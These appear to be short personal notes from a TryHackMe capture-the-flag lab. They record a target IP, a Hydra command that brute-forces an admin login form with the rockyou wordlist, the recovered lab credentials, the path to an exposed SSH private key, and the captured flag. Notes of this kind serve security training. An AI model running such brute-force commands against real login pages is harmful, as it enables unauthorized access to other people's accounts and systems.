ip: 10.10.53.177

/admin login page

hydra -l admin -P rockyou.txt 10.10.53.177 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V

user=admin&pass=passwdiguess

**CREDS**
uname: admin
paswd: xavier

ssh RSA key
http://10.10.53.177/admin/panel/id_rsa




**FLAGS**
THM{brut3_f0rce_is_e4sy}